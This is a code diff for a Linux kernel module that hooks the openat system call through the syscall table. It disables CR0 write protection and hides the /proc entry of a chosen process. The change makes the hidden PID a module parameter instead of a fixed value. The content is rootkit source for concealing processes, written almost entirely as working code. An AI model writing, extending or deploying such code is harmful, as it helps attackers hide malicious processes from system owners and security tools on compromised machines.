@@ -1,5 +1,6 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/moduleparam.h>
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
@@ -11,10 +12,12 @@
 void initialize_path_to_hide(void);
 
 // Types & other consts.
+static char *pid_to_hide;
+module_param(pid_to_hide, charp, 0);
+
 typedef int (*original_openat_t)(const struct pt_regs *regs);
 static original_openat_t original_openat_ptr;
 static unsigned long *syscall_table; 
-static char pid_to_hide[] = "7544";
 static char *path_to_hide;
  
 static inline void wp_cr0(unsigned long val) {
@@ -44,11 +47,9 @@ int new_openat(const struct pt_regs *regs) {
 
     return original_openat_ptr(regs);
 }
- 
+
 void initialize_path_to_hide(void) {
     char proc_path[] = "/proc/";
-
-    // + 1 for the null terminator at the end of the string.
     int path_to_hide_len = strlen(pid_to_hide) + strlen(proc_path) + 1;
     path_to_hide = kmalloc(path_to_hide_len, GFP_KERNEL);
     sprintf(path_to_hide, "%s%s", proc_path, pid_to_hide);
